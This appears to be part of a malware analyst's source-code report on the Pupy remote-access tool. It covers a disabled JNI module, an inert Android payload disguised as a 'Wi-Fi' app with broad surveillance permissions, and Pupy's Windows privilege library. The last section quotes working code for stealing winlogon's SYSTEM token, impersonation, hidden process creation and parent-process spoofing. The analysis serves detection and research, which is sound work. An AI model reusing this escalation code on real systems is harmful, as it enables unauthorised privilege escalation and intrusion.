- **`AttachCurrentThread` on `JNI_EDETACHED` (`:942-948`)** — the code detects that the calling thread is not attached to the JVM and attaches it, then logs `args.name` and `args.version`. Note `JavaVMAttachArgs args;` is declared at `:930` and **passed to `AttachCurrentThread` at `:944` without its fields being initialised** in the visible path — `args.name` is read at `:946` right after. Uninitialised `JavaVMAttachArgs` is a genuine defect in that branch, though it only affects a debug log line. `[source: jni_on_load.c:930, :944-946]`

### 18.5 The second shipped-broken feature

**This is the same failure mode as §17, independently arrived at, which makes it a pattern rather than a one-off:**

| | Persistence (§17) | JVM module (§18) |
|---|---|---|
| Operator-facing surface | config + CLI module + scriptlet | 9 documented `PyMethodDef` entries |
| Implementation | **missing file** (`pupwinutils/persistence.py`) | **present but commented out** |
| Failure mode | `ImportError` at load | no `jvm` module; `import jvm` fails |
| Self-documenting tombstone | none | `"NOT IMPLEMENTED: broken jvm setup"` |
| Severed at | 1 level (missing module) | **3 levels** (impl + 2 call sites + empty stubs) |

`[sources: §17; jni_on_load.c:899-911; Python-dynload.c:326; sources-linux-py3/pupy.c:539]`

The difference in *style* is instructive: persistence was **left dangling** (a reference to a file that was never committed), while the JVM module was **deliberately disabled and labelled broken by its own author** (`:909`). One is an oversight; the other is a known-broken feature shipped with a comment saying so. Both remain in the tree, both are advertised by their interface, neither works. `[source: as cited; inference]`

### 18.6 Corrections to §1.9

§1.9 recorded `jni_on_load.c` as having a `setup_jvm_class` **"stub"**. That was **too generous and imprecise**:

1. The function is not a stub by design — it is a **gutted implementation** whose real body survives in comments. `[source: jni_on_load.c:899-911]`
2. The file is at **`client/common/`**, not under `sources-windows-py3/`. `[source: measured]`
3. It is **shared** by the Windows reflective entry (`main_reflective.c:12`) and the Linux `main_so.c:14` — it is not a Windows-only or Android-only file. `[source: main_reflective.c:12; sources-linux-py3/main_so.c:14]`
4. The live/disabled boundary is now exactly drawn (§18.4): `JNI_OnLoad` executes, `setup_jvm_class` cannot. `[source: §18.4]`

**U-4b is CLOSED.** `jni_on_load.c` is read to the level required. Android bootstrap is no longer half-mapped.

---

## 19. Status of the §14.8 read-vs-not-read list

The Lead asked that this list be re-checked against reality before new work, in case entries had shifted. **They had.** Corrections are recorded inline in §14.8; summarised here:

| Item | First version said | Measured reality |
|---|---|---|
| `jni_on_load.c` | "30,294 B" implied under `sources-windows-py3/` | **`client/common/`**, shared by Windows + Linux |
| `main_exe.c` | attributed to Linux tree only | **exists in BOTH trees** (Windows 803 B, Linux 803 B) |
| `actctx.c` | absent from list | **732 B**, present |
| `resource_python_manifest.c` | absent from list | **1,508 B**, present |
| `tmplibrary.c`/`ld_hooks.c`/`daemonize.c`/Linux `pupy.c` | listed without a tree | all `sources-linux-py3/` |
| `sources-windows-py3/` total | not stated | **33 files** |

---

## 20. U-4b completion — the Android bootstrap, and a THIRD shipped-broken feature

§18 closed `jni_on_load.c`. task-16 asked four further questions about the Android path. Answering them **overturns the framing** of §18 and adds a third dead feature.

### 20.1 `jni_on_load.c` has NO `JNI_OnUnload` and NO `RegisterNatives`

A grep of the whole 1,012-line file for `JNI_OnUnload|RegisterNatives|run_pupy|PyInit|dlopen|xz_dynload` returns **exactly one match** — the `JNI_OnLoad` definition at `:924`. `[source: grep of client/common/jni_on_load.c]`

Consequences:

1. **There is no `JNI_OnUnload`.** The library has no symmetrical teardown: `__jvm`, `__j_initial_classloader`, `__j_ClassLoader`, and the cached `jmethodID` are never released, and `DetachCurrentThread` is never called on the attached thread (§18.4 attached it on `JNI_EDETACHED`). Once attached, that thread stays attached for the process lifetime. `[source: jni_on_load.c:923-1012; §18.4]`
2. **There is no `RegisterNatives` table.** Nothing native is registered against a Java class. So the implant exposes **no Java-callable methods** — it does not, and cannot, be driven from Java code. `[source: grep — no matches]`
3. **The CPython chain does NOT land in `jni_on_load.c`.** There is no `run_pupy`, `PyInit__pupy`, `xz_dynload`, or `dlopen` call in the entire file. §18.4's live path (`JNI_OnLoad`) obtains a `JNIEnv` and caches JVM state — **and that is all it does.** It never starts Python. `[source: jni_on_load.c:923-1012]`

**This sharpens §18.3-§18.4 correctly:** the subsystem is not merely "half alive" — it is **alive for bookkeeping and dead for purpose**. `JNI_OnLoad` runs, attaches a thread, resolves `java.lang.Thread` via `get_thread_class` (`:956`), and then stops. The classloader machinery (`:153`-`:783`) is populated with state that no live code ever reads, for a module that is never created. `[source: jni_on_load.c:923-1012, :870-911]`

### 20.2 Where the CPython chain actually lands — it does not, on Android

The `xz_dynload → dlopen → PyInit__pupy` chain (§1.8, §14.4) lives in the **platform loader files**, not in the JNI shim:

| Platform | File | Chain |
|---|---|---|
| Windows | `sources-windows-py3/pupy_load.c` | `xz_dynload("_pupy.pyd", …)` → `MyGetProcAddress("PyInit__pupy")` |
| Linux | `sources-linux-py3/pupy_load.c:90-96` | `xz_dynload("_pupy.so", …)` → `dlsym("PyInit__pupy")` |
| **Android** | **`jni_on_load.c`** | **absent** |

`[source: sources-linux-py3/pupy_load.c:90-96; §1.8; grep of jni_on_load.c]`

**`main_reflective.c` `#include`s `jni_on_load.c` at line 12 — and never calls either of its functions.** The full 93-line file contains no reference to `JNI_OnLoad` or `setup_jvm_class`; its entry points are `DllMain` (`:34`), `Launch` (`:29`), and `delayedMainThread` (`:22`), all of which route to `execute(...)` or `initialize(TRUE)`. The `#include` is **vestigial** on the Windows path. `[source: main_reflective.c:12, :22-93]`

So on Android the Python start chain is **not established by any file in this tree**. This is consistent with a third finding below.

### 20.3 THIRD shipped-broken feature — the Android payload is a placeholder

`android_sources/pp.py` is **138 bytes and is a stub**:

```python
# android_sources/pp.py:1-6
from __future__ import print_function
import time

def main():
    print("pp.py is not replaced with working one!")
    time.sleep(1)
```
`[source: client/android_sources/pp.py:1-6]`

And `main.py` drives it in an unbounded loop:

```python
# android_sources/main.py:17-25
    import pp

    while True:
        try:
            pp.main()
        except Exception as e:
            import traceback
            traceback.print_exc()
            time.sleep(10)
```
`[source: client/android_sources/main.py:17-25]`

**The shipped Android payload loops forever printing `"pp.py is not replaced with working one!"` and sleeping.** The string itself states the contract: the real `pp.py` is meant to be **substituted at build time** by the Android build pipeline, and in this tree it never was. `[source: android_sources/pp.py:5; inference]`

This is the **third** advertised-but-non-functional feature, and it is the **most severe of the three** because it is unconditional: persistence (§17) and the JVM module (§18) are both dead on all platforms, but the Android payload is dead *by default build*, and the file documents its own brokenness in the string it prints. `[sources: §17, §18; android_sources/pp.py:5]`

**The three together:**

| # | Feature | Defect class | Severity |
|---|---|---|---|
| 1 | Windows persistence (§17) | **missing implementation** (`pupwinutils/persistence.py` absent) | feature unreachable |
| 2 | JVM module (§18) | **commented out** at 3 levels | feature unreachable |
| 3 | **Android payload (§20)** | **placeholder file** (`pp.py` prints "not replaced") | **payload inert by default build** |

Three independent features, three different defect classes (absent / disabled / stubbed), none working. The pattern from §18.5 is now a corpus property: **Pupy advertises more capability than it ships, and says so in its own strings.** `[sources as cited]`

### 20.4 The Android build configuration — the masquerade and the permission set

`android_sources/buildozer.spec.example` (`:4`, `:7`, `:10`):

```
title = Wi-Fi
package.name = pupy
package.domain = org.pupy
```
`[source: client/android_sources/buildozer.spec.example:4, :7, :10]`

**The installed app is titled `Wi-Fi`** and packaged as `org.pupy.pupy` — a user-visible masquerade matching the Windows `OneDriveUpdate` persistence name (§17) and the `libc.so.6` memfd name (§14.5). Three platforms, three disguises, one pattern. `[source: buildozer.spec.example:4, :7, :10; §14.5, §17]`

`p4a.bootstrap = badservice` (`:133`) — explicitly selects python-for-android's **`badservice`** bootstrap, the non-Activity background-service bootstrap. That is the correct choice for a payload needing to run without a visible UI, and it is a deliberate selection, not a default. `[source: buildozer.spec.example:133]`

`requirements` (`:39`) — `pycrypto,plyr,psutil,tinyec,netaddr,pyjnius,pyuv,cryptography`. Note **`pyjnius`** (the JNI Python bridge) and **`tinyec`** (the ECPV dependency, §2) and **`pyuv`** (async I/O). `[source: buildozer.spec.example:39]`

`android.permissions` (`:88`) is a **single line with ~40 permissions**, including `READ_SMS`, `SEND_SMS`, `RECEIVE_SMS`, `READ_CALL_LOG`, `WRITE_CALL_LOG`, `CALL_PRIVILEGED`, `PROCESS_OUTGOING_CALLS`, `RECORD_AUDIO`, `CAMERA`, `ACCESS_FINE_LOCATION`, `READ_CONTACTS`, `GET_ACCOUNTS`, `DELETE_PACKAGES`, `DUMP`, `FACTORY_TEST`, `NFC`, `BLUETOOTH_PRIVILEGED`. This is the **complete surveillance and device-control set** requested up front — the operator-facing capability list, and the most direct statement of Android intent anywhere in the corpus. `[source: buildozer.spec.example:88]`

`android.whitelist` (`:125`) names `lib-dynload/termios.so`, `mmap.so`, `_json.so`, `pyexpat.so` — the native stdlib modules retained in the APK. `[source: buildozer.spec.example:125]`

### 20.5 Does `jni_on_load.c` make the `main.py` falsifications necessary?

**No.** The task asked this directly, and the answer is `jni_on_load.c` is **not** the reason for either falsification:

- **`sys.executable = 'PythonService'`** (`main.py:15`) — this exists because python-for-android's `badservice` bootstrap runs the interpreter from a service, where `sys.executable` would otherwise point at a path that does not exist or is not meaningful. It is set so that **Pupy's own Python code that reads `sys.executable`** gets a plausible value — and §14.6 already established the concrete consumer: `scriptlets/persistence.py:45-46` (`src = sys.executable`) and `pupy.c`'s file copy paths. `jni_on_load.c` never reads `sys.executable`. `[source: main.py:15; scriptlets/persistence.py:45-46; §14.6]`
- **`platform.system = lambda: 'android'`** (`main.py:11`) — a **pure Python-level patch** to make `platform.system()` report `android`. Python-for-android's bootstrap does not set this correctly for all builds, so the payload sets it itself. Again: nothing in `jni_on_load.c` participates. `[source: main.py:11]`

Both falsifications are **Python-side compatibility shims for the build bootstrap**, not consequences of the JNI layer. `jni_on_load.c` is a separate, disabled subsystem that happens to ship in the same tree. `[source: main.py:11, :15; jni_on_load.c entire]`

### 20.6 What an on-device analyst could and could not observe

Directly answering the task's closing question.

**Could observe:**

- **The installed app title `Wi-Fi`** and package `org.pupy.pupy` — trivially from the package manager. A security-relevant app masquerading as Wi-Fi settings is an immediate red flag. `[source: buildozer.spec.example:4, :7, :10]`
- **The permission set** — ~40 permissions including SMS send/receive, call logs, `CALL_PRIVILEGED`, `FACTORY_TEST`, `DUMP`. The request list alone is anomalous. `[source: buildozer.spec.example:88]`
- **The `"pp.py is not replaced with working one!"` string in the APK** and, on a build that shipped the stub, on stdout. This is a **direct, greppable indicator that the payload is inert** — an analyst finding it can correctly conclude the Android implant does nothing. `[source: android_sources/pp.py:5]`
- **A background service with no Activity** (`badservice` bootstrap). `[source: buildozer.spec.example:133]`
- **The `PythonService` string** wherever the payload's own code is inspected. `[source: main.py:15]`

**Could not observe:**

- **The `jvm` module** — it does not exist at runtime (§18). An analyst searching for JNI-driven classloader manipulation finds only dead C.
- **`RegisterNatives`-registered methods** — there are none (§20.1). No Java-callable surface exists to enumerate.
- **Classloader manipulation activity** — the machinery at `jni_on_load.c:153-783` is unreachable. There is no runtime behaviour to observe. `[source: §18.3, §20.1]`
- **A CPython start chain from Java** — `jni_on_load.c` never starts Python (§20.2). If the shipped payload runs at all, it is via the `badservice` bootstrap's own entry, not via this file. `[source: §20.2]`

**Net:** an on-device analyst who finds the stub string can state with confidence that this build is inert; an analyst who does *not* look for it might infer a classloader-capable Android implant from the C source, which would be **wrong**. That inversion is exactly why §18's framing was corrected here. `[source: §20.3, §20.5; inference]`

### 20.7 U-4b — CLOSED, finally

`jni_on_load.c` is now read to the level the task required: entry sequence (`JNI_OnLoad` only, no `JNI_OnUnload`, no `RegisterNatives`), the disabled module (`:870-911`), the unreachable classloader subsystem (`:6-16`, `:153`-`:783`), the live/dead boundary, and — via `main_reflective.c` and the Android tree — where the chain does **not** go. The Android bootstrap is **no longer half-mapped**; it is mapped, and what it maps to is a disabled subsystem plus a placeholder payload. `[source: §18, §20]`

`[source: measured sources-windows-py3/ and client/common/]`

**Still open from U-4:** `MemoryModule.c` bodies (51,876 B), `MyLoadLibrary.c` (27,034 B), `postmortem.c` (25,642 B), `thread.c`, `LoadLibraryR.c`, `in-mem-exe.c`, `GetProcAddressR.c`, `remote_thread.c`, `actctx.c`, `resource_python_manifest.c`, Windows `main_exe.c`, and the `sources-linux-py3/` bodies. Recorded as **U-4a**/§15. `[source: §14.8]`

---

## 21. U-5 CLOSED — `pupwinutils/security.py`, the Windows privilege surface

**Path:** `pupy/packages/windows/all/pupwinutils/security.py` — **78,800 B / 2,842 lines.** The largest file in Pupy and the one §6 never opened. **It is a complete, working Windows security/token library — no stubs, no placeholders, no dead code at the operational level.** This closes U-5 and **reverses** the expectation set by §17/§18/§20, where the pattern was advertised-but-broken. `[source: pupwinutils/security.py — full file measured]`

### 21.1 Verdict up front

**This file works.** It is not in the §17/§18/§20 defect class. Every function has a live body, a real Win32 call, and error handling. The `getsystem`, token-impersonation, and PPID-spoofing paths are complete implementations of published techniques. **Pupy's Windows evasion is real, and this is where it lives.** `[source: §21.2-§21.7]`

### 21.2 Function inventory

The file is roughly two-thirds ctypes scaffolding (structures, prototypes, constants) and one-third logic. Organised by capability:

#### A. Token acquisition and impersonation

| Line | Function | Purpose | Win32 surface |
|---|---|---|---|
| `:1607` | `EnablePrivilege` | Enable one privilege on a token | `OpenProcess`, `OpenProcessToken`, `LookupPrivilegeValueA`, `AdjustTokenPrivileges` |
| `:1739` | `getProcessToken` | Open a process's token | `OpenProcessToken` |
| `:1758` | `get_thread_token` | Current thread token | `OpenThreadToken` |
| `:1776` | `get_process_token` | Current process token | `OpenProcessToken` |
| `:1788` | `gethTokenFromPid` | Token handle by PID | `OpenProcess`, `OpenProcessToken` |
| `:1823` | `getSidToken` | **Token for a SID — hunts `winlogon` for SYSTEM** | `OpenProcessToken` + cache |
| `:1847` | `impersonate_pid` | Impersonate by PID | `DuplicateTokenEx`, `ImpersonateLoggedOnUser` |
| `:1864` | `impersonate_sid` | Impersonate by SID/name | as above |
| `:1948` | `impersonate_token` | **Core duplication + impersonation** | `DuplicateTokenEx`, `ImpersonateLoggedOnUser` |
| `:2110` | `rev2self` | Drop impersonation | `RevertToSelf` |
| `:1980` | `isSystem` | Am I SYSTEM | via `ListSids` |
| `:1989` | `token_impersonated_as_system` | Is this token SYSTEM | `GetTokenSid` |

#### B. Process creation with a token

| Line | Function | Purpose | Win32 surface |
|---|---|---|---|
| `:2029` | `start_proc_with_token` | **Create process under a duplicated token** | `CreateEnvironmentBlock`, `CreateProcessAsUser`, `DestroyEnvironmentBlock` |
| `:1993` | `create_proc_as_sid` | Process as an arbitrary SID | via above |
| `:2015` | `getsystem` | **`create_proc_as_sid('S-1-5-18')`** | via above |
| `:2692` | `create_new_process_from_ppid` | **PPID spoofing** | `InitializeProcThreadAttributeList`, `UpdateProcThreadAttribute`, `CreateProcessW` |

#### C. SID / account resolution

| Line | Function | Purpose |
|---|---|---|
| `:1575` | `GetTokenSid` | Token → SID string |
| `:1678` | `ListSids` | Enumerate (pid, name, sid, username) |
| `:2357` | `strsid` | SID → string |
| `:2373` | `namebysid` | SID → name (`LookupAccountSidW`) |
| `:2403` | `sidbyname` | name → SID (`LookupAccountNameW`) |
| `:1559` | `GetUserName` | `GetUserNameW` |

#### D. Logon-session enumeration (credential-adjacent)

| Line | Function | Purpose | Win32 surface |
|---|---|---|---|
| `:1498` | `EnumerateLogonSessions` | **All interactive/network/cached logons** | `LsaEnumerateLogonSessions`, `LsaGetLogonSessionData`, `LsaFreeReturnBuffer` |
| `:1098` | `LsaSessionDataFlagsToStr` | Decode session flags |
| `:1113` | `FileTimeToUnix` | Time conversion |

#### E. ACL / security-descriptor analysis

| Line | Function | Purpose |
|---|---|---|
| `:2253` | `access` | Effective access check for a path |
| `:2432` | `_getfileinfo` | Raw security-info fetch |
| `:2470` | `getfileowner` | File owner |
| `:2619` | `getfileowneracls` | **Walk a file's DACL** |
| `:2484` | `class Ace` | Parsed ACE object |

#### F. Host posture

| Line | Function | Purpose |
|---|---|---|
| `:1459` | `RtlGetVersion` | Real OS version (`ntdll`, bypasses shim) |
| `:2154` | `can_get_admin_access` | **UAC linked-token admin check** |
| `:2239` | `get_windows_version` | Version tuple |
| `:2764` | `get_integrity_level` | **Process integrity level** |

`[source: security.py — all lines as tabulated]`

### 21.3 The privilege set — exact `TOKEN_*` rights and `Se*` privileges

The `TOKEN_*` access rights are defined at `:88-97`, with `TOKEN_ALL_ACCESS` at `:105-111` as the union:

```
TOKEN_ASSIGN_PRIMARY      0x0001
TOKEN_DUPLICATE           0x0002
TOKEN_IMPERSONATE         0x0004
TOKEN_QUERY               0x0008
TOKEN_QUERY_SOURCE        0x0010
TOKEN_ADJUST_PRIVILEGES   0x0020
TOKEN_ADJUST_GROUPS       0x0040
TOKEN_ADJUST_DEFAULT      0x0080
TOKEN_ADJUST_SESSIONID    0x0100
TOKEN_READ = STANDARD_RIGHTS_READ | TOKEN_QUERY
```
`[source: security.py:88-97]`

**`TOKEN_ALL_ACCESS` is requested at `:1958`** in `impersonate_token` — the maximal right set, including `TOKEN_ASSIGN_PRIMARY`, `TOKEN_DUPLICATE`, and `TOKEN_ADJUST_PRIVILEGES`. That is more than impersonation strictly requires, and it is exactly what enables the subsequent `CreateProcessAsUser` primary-token path. `[source: security.py:1957-1959]`

**`Se*` privileges actually enabled, with call sites:**

| Privilege | Enabled in | Line |
|---|---|---|
| `SeDebugPrivilege` | `impersonate_token`, `impersonate_pid`, `getSidToken`, `create_new_process_from_ppid` | `:1949`, `:1848`, `:1827`, `:2704` |
| `SeImpersonatePrivilege` | `impersonate_token` | `:1950` |
| `SeAssignPrimaryTokenPrivilege` | `impersonate_token` (on the **duplicated** token) | `:1963-1965` |
| `SeIncreaseQuotaPrivilege` | `impersonate_token` (on the duplicated token) | `:1966-1968` |

`[source: security.py:1827, :1848, :1949-1950, :1963-1968, :2704]`

**`SeDebugPrivilege` is the load-bearing one** — it permits `OpenProcessToken` against a process the caller does not own, the prerequisite for every impersonation path here. It is enabled with **`exc=False` at every call site** (`:1827`, `:1848`, `:1949`), meaning **failure to obtain it is swallowed and execution continues to the next step.** `[source: security.py:1827, :1848, :1949]`

`AdjustTokenPrivileges` handling is correct and unusually careful (`:1655-1669`): `ERROR_SUCCESS` → success; `ERROR_NOT_ALL_ASSIGNED` → descriptive `ValueError` ("access denied") only if `exc`; other errors → `WinError`. This handles the standard subtlety that `AdjustTokenPrivileges` returns TRUE even on partial failure. `[source: security.py:1655-1669]`

### 21.4 `getsystem` — the token-theft chain, quoted

```python
# security.py:2015-2016
def getsystem(prog='cmd.exe'):
    return create_proc_as_sid(SID_SYSTEM, prog=prog)
```
`[source: security.py:2015-2016]` — `SID_SYSTEM = 'S-1-5-18'` (`:246`).

```python
# security.py:1993-2012
def create_proc_as_sid(sid, prog='cmd.exe', attributes=None, lpInfo=False):
    if not sid.startswith('S-1-'):
        sid = sidbyname(sid)
        ...
    hTokendupe = impersonate_sid(sid, close=False)
    try:
        vResult = start_proc_with_token(
            [prog], hTokendupe, attributes=attributes, lpInfo=lpInfo
        )
    finally:
        CloseHandle(hTokendupe)
    return vResult
```
`[source: security.py:1993-2012]`

The SID→token selection is the operational heart of the technique:

```python
# security.py:1823-1844
def getSidToken(token_sid):
    if token_sid in IMPERSONATION_TOKENS:
        return IMPERSONATION_TOKENS[token_sid][1]

    EnablePrivilege("SeDebugPrivilege", exc=False)

    # trying to get system privileges
    for (pid, name, sid, username) in ListSids():
        if token_sid == SID_SYSTEM:
            if 'winlogon' not in name.lower():
                continue
        elif token_sid != sid:
            continue

        hToken = gethTokenFromPid(pid, exc=True)
        if not hToken:
            continue

        IMPERSONATION_TOKENS[token_sid] = username, hToken
        return hToken
```
`[source: security.py:1823-1844]`

**Three things make this work, and each is a detection artifact:**

1. **The `winlogon` filter (`:1832`)** — for SYSTEM it does **not** take *any* SYSTEM-owned process; it specifically requires `winlogon` in the image name. `winlogon.exe` runs as SYSTEM at high integrity and exists in every interactive session, making it the canonical token donor. A defender seeing a non-Windows process open `winlogon.exe`'s token is looking at this line. `[source: security.py:1831-1833]`
2. **`SeDebugPrivilege` is the prerequisite and is enabled here (`:1827`)** — without it `OpenProcessToken` against `winlogon` fails. `[source: security.py:1827, :1838]`
3. **Tokens are cached in a module-global dict (`:1813`, `:1843`)** and the close is **commented out** at the only return path:
   ```python
   # security.py:1879-1880
       # Cached by getSidToken
       # CloseHandle(hToken)
   ```
   The comment is honest — the handle is intentionally held because it is cached. The consequence is a persistent privileged handle held for the implant's lifetime, never released. `[source: security.py:1813, :1843, :1879-1880]`

```python
# security.py:1948-1977
def impersonate_token(hToken):
    EnablePrivilege('SeDebugPrivilege', exc=False)
    EnablePrivilege('SeImpersonatePrivilege', exc=False)

    hTokendupe = HANDLE(INVALID_HANDLE_VALUE)

    SecurityImpersonation = 2
    TokenPrimary = 1

    if not DuplicateTokenEx(
        hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation,
            TokenPrimary, byref(hTokendupe)):
        raise WinError(get_last_error())

    try:
        EnablePrivilege(
            'SeAssignPrimaryTokenPrivilege', hToken=hTokendupe, exc=False
        )
        EnablePrivilege(
            'SeIncreaseQuotaPrivilege', hToken=hTokendupe, exc=False
        )

        if not ImpersonateLoggedOnUser(hTokendupe):
            raise WinError(get_last_error())

    except Exception:
        CloseHandle(hTokendupe)
        raise

    return hTokendupe
```
`[source: security.py:1948-1977]`

**The duplication parameters are deliberate and significant:** `SecurityImpersonation` (level 2) with `TokenPrimary` (type 1). A **primary** token is required for `CreateProcessAsUser`; impersonation level is required for `ImpersonateLoggedOnUser`. Requesting `TokenPrimary` at `SecurityImpersonation` yields a token usable for **both** — impersonate the thread *and* spawn a process with it. Level 3 (`SecurityDelegation`) is defined at `:244` but **not used**, which is correct: delegation requires Kerberos and is unnecessary here. `[source: security.py:241-244, :1954-1959]`

```python
# security.py:2079-2093
    if hTokendupe is not None:
        cenv = c_void_p()
        dwCreationflag |= CREATE_UNICODE_ENVIRONMENT

        if not CreateEnvironmentBlock(byref(cenv), hTokendupe, 0):
            raise WinError(get_last_error())

        try:
            if not CreateProcessAsUser(
                hTokendupe, application, args, None, None, inherit_handles,
                dwCreationflag, cenv, None,
                    byref(lpStartupInfo), byref(lpProcessInformation)):
                raise WinError(get_last_error())
        finally:
            DestroyEnvironmentBlock(cenv)
```
`[source: security.py:2079-2093]`

`CreateEnvironmentBlock(byref(cenv), hTokendupe, 0)` at `:2083` builds the environment **from the target token**, not the caller's — so the spawned SYSTEM process gets SYSTEM's `%USERPROFILE%`, `%TEMP%`, `%APPDATA%` — and `DestroyEnvironmentBlock` at `:2093` releases it in a `finally`. Complete and correct. `[source: security.py:2083, :2093]`

**`start_proc_with_token` also forces concealment** (`:2059-2062`): `CREATE_NO_WINDOW` + `STARTF_USESHOWWINDOW` + `SW_HIDE`. Note this is the **correct** combination — compare §14.1's `mexec`, which sets `CREATE_NEW_CONSOLE` and relies on `STARTF_USESHOWWINDOW` alone (flagged as **U-9**). This file uses `CREATE_NO_WINDOW`, which actually suppresses the console. Same codebase, two files, and the security library is right where the C extension is not. `[source: security.py:2059-2062; §14.1, U-9]`

### 21.5 `create_new_process_from_ppid` — PPID spoofing, and it is REAL

```python
# security.py:2692-2699
def create_new_process_from_ppid(ppid, cmd):
    """
    Create new process as SYSTEM via Handle Inheritance specifying
    privileged parent
    Returns True if no problem
    Based on : https://github.com/decoder-it/psgetsystem/
        blob/master/psgetsys.ps1
    """
```
`[source: security.py:2692-2699]`

**The docstring cites its source: `decoder-it/psgetsystem`'s `psgetsys.ps1`** — a faithful Python port of a published offensive-security tool, credited in-line. The technique: create a process whose **declared parent** is a SYSTEM process, so the child inherits the parent's token and security context. `[source: security.py:2697-2698]`

```python
# security.py:2704-2732
    EnablePrivilege("SeDebugPrivilege")

    # 1.Call with null lpAttributeList first to get back the lpSize
    InitializeProcThreadAttributeList(None, 1, 0, byref(lpSize))

    # 2.Initialize the attribute list
    lpAttributeList = create_string_buffer(lpSize.value)
    if not InitializeProcThreadAttributeList(
            lpAttributeList, 1, 0, byref(lpSize)):
        raise WinError(get_last_error())

    handle = OpenProcess(PROCESS_ALL_ACCESS, False, int(ppid))
    if not handle:
        raise WinError(get_last_error())

    last_error = None
    hHandle = HANDLE(handle)

    if not UpdateProcThreadAttribute(
        lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            byref(hHandle), sizeof(hHandle), 0, None):
        last_error = get_last_error()
        CloseHandle(handle)
        raise WinError(last_error)
```
`[source: security.py:2704-2732]`

- `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` (`:2728`; defined `0x00020000` at `:253`) sets the spoofed parent.
- **`OpenProcess(PROCESS_ALL_ACCESS, ...)` (`:2720`)** — maximum rights on the parent handle. `SeDebugPrivilege` (enabled `:2704`) is what makes this succeed against a SYSTEM process.
- The two-call `InitializeProcThreadAttributeList` idiom (query size → allocate → initialise) is implemented correctly at `:2707-2713`.

```python
# security.py:2745, :2753-2758
    lpStartupInfo.lpAttributeList = addressof(lpAttributeList)
    ...
    dwCreationFlags = (CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT)

    if not CreateProcessW(
        None, cmd, None, None, 0, dwCreationFlags, None,
            None,  byref(lpStartupInfo), byref(lpProcessInformation)):
        raise WinError(get_last_error())
```
`[source: security.py:2745, :2753-2758]`

`EXTENDED_STARTUPINFO_PRESENT` is **mandatory** for the attribute list to be honoured; `STARTUPINFOEX` is used (`:2737`); `lpStartupInfo.StartupInfo.cb = sizeof(lpStartupInfo)` at `:2744` sets the size correctly. `CreateProcessW(None, cmd, ...)` with `application=None` means the executable is parsed out of the command line. `[source: security.py:2737-2745, :2753-2758]`

**A real privilege-escalation primitive, not a stub.** It requires `SeDebugPrivilege`, so it is a *pivot* primitive rather than a from-nothing escalation — but within that constraint it is complete. `[source: security.py:2692-2761]`

One defect: the docstring says "Returns True if no problem" (`:2696`) but the function **returns a PID**: `return lpProcessInformation.dwProcessId` (`:2761`). Stale docstring. `[source: security.py:2696, :2761]`

### 21.6 Credential access — the honest answer

**Does `security.py` touch LSASS, SAM, or another process's token?**

- **LSASS, directly: NO.** No `lsass` string, no `MiniDumpWriteDump`, no `ReadProcessMemory` of LSASS. No memory-dumping or credential-extraction code in this file. `[source: grep — no lsass/minidump/ReadProcessMemory]`
- **SAM: NO.** No SAM hive access, no `RegOpenKey` on `SAM`. `[source: grep — no matches]`
- **Another process's token: YES, entirely.** That is the whole file — `gethTokenFromPid` (`:1788`) → `OpenProcessToken` on an arbitrary PID, driven at `winlogon` specifically by `getSidToken` (`:1823`). `[source: security.py:1788, :1823-1844]`
- **Logon-session metadata: YES.** `EnumerateLogonSessions` (`:1498`) calls `LsaEnumerateLogonSessions`/`LsaGetLogonSessionData` (`:1123-1139`) and marshals `SECURITY_LOGON_SESSION_DATA` (`:1049-1077`), decoding flags via `LsaSessionDataFlagsToStr` (`:1098`) and `LOGON_TYPE` (`:1081`). This yields **usernames, SIDs, logon types, and session timestamps for every session on the host** — including cached/network logons — **without `SeDebugPrivilege` and without touching LSASS**, via the documented LSA API. `[source: security.py:1049-1139, :1498]`

**Critical distinction for the corpus contrast:** `EnumerateLogonSessions` requires no elevation — the same unprivileged LSA surface Havoc's `LsaConnectUntrusted` → `LsaCallAuthenticationPackage` path uses (D5). Pupy reaches the **same data** by a different LSA entry point. `[source: §21.6; D5 contrast per task-16]`

**So: no credential dumping, but full token theft and full logon-session enumeration.** An analyst hunting Pupy as a credential thief should look for **`winlogon` token access**, not LSASS reads. `[source: security.py entire; inference]`

### 21.7 Live-vs-stub check — the task's explicit question

The task asked whether this file shares the defect class of the AMSI/ETW stub. **It does not.** Verified by reading every operational function body:

`getsystem` (`:2015`), `create_proc_as_sid` (`:1993`), `impersonate_token` (`:1948`), `impersonate_sid` (`:1864`), `getSidToken` (`:1823`), `EnablePrivilege` (`:1607`), `create_new_process_from_ppid` (`:2692`), `can_get_admin_access` (`:2154`), `EnumerateLogonSessions` (`:1498`), `start_proc_with_token` (`:2029`) → **all live.** `[source: each function body read; §21.2-§21.6]`

**No `print("not implemented")`, no commented-out body, no placeholder return.** The only commented-out lines are the intentional handle-close at `:1879-1880` and the alternative `gethTokenFromPid(pid, exc=False)` at `:1839`, both annotated. `[source: security.py:1839, :1879-1880]`

**This matters for the corpus verdict.** §17/§18/§20 established three advertised-but-broken features. §21 establishes that the **privilege core is not among them** — it is fully functional. The correct corpus statement is: *"Pupy's Windows privilege layer is real and complete; three peripheral features are not."* That distinction is what §21 was for. `[source: §17, §18, §20, §21]`

### 21.8 The D1/D5 axis — where Pupy sits

| | **Sliver** (D1 §15) | **Havoc** (D5) | **Pupy** (§21) |
|---|---|---|---|
| AMSI/ETW bypass | 1-byte `0xC3` patch, **fail-closed** | — | not in this file |
| Elevation needed? | yes (write to process memory) | **NO** — `LsaConnectUntrusted` unprivileged | **YES** — `SeDebugPrivilege` for token theft |
| Technique | in-memory patch | LSA auth package | **token duplication + impersonation + PPID spoof** |
| Fail mode | fails closed | — | **`exc=False` swallows and continues** |
| Credential data | — | LSA package | logon sessions (unprivileged) |
| Operator-facing | one patch primitive | one LSA call | **68 functions, full security API mirror** |

`[sources: D1 §15, D5, security.py §21.2-§21.7]`

**Pupy sits at the opposite end from Sliver on granularity, and the opposite end from Havoc on privilege requirement.**

**vs Sliver:** Sliver's evasion is a single blunt patch that **fails closed** — if it cannot be written, the operation does not proceed. Pupy's privilege code is a broad, layered API where privileged steps are attempted with `exc=False` and **failure is swallowed** so execution continues to the next path. **Sliver refuses; Pupy degrades.** For an analyst, Pupy produces a **long, messy, partially-successful artifact trail** (failed `OpenProcessToken` attempts, repeatedly enabled privileges, cached handles) where Sliver produces nothing at all on failure. `[source: §21.3-§21.4; D1 §15]`

